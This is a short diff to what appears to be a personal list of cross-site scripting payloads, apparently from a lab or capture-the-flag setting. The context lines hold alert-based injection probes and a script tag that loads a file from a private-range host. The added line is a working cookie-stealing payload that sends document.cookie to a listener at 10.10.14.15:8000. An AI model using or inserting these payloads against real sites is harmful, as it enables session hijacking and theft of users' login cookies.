@@ -30,3 +30,4 @@ javascript:alert('Current%20domain:%20'%20+%20document.domain);
 '-alert(`Advantio`)-'
 em-fp=65447b3f-6014-44f8-96b8-5a0957f8ac03hxoml'-alert(1)-'k5or3
 <script src="http://10.10.14.4:8000/test.txt"></script>
+<script>new Image().src="http://10.10.14.15:8000/test?cookie="+document.cookie;</script>
